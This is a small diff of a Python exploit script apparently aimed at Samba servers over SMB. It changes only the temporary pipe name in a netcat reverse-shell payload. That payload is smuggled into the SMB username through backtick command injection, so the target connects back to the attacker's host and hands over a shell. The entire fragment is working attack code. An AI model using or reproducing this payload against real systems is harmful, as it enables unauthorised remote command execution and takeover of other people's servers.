@@ -3,7 +3,7 @@ from smb.SMBConnection import SMBConnection
 
 
 def exploit(rhost, rport, lhost, lport):
-    payload = 'mkfifo /tmp/pmital; nc ' + lhost + ' ' + lport + ' 0</tmp/pmital | /bin/sh >/tmp/pmital 2>&1; rm /tmp/pmital'
+    payload = 'mkfifo /tmp/viper; nc ' + lhost + ' ' + lport + ' 0</tmp/viper | /bin/sh >/tmp/viper 2>&1; rm /tmp/viper'
     username = "/=`nohup " + payload + "`"
     conn = SMBConnection(username, "", "", "")
     try:
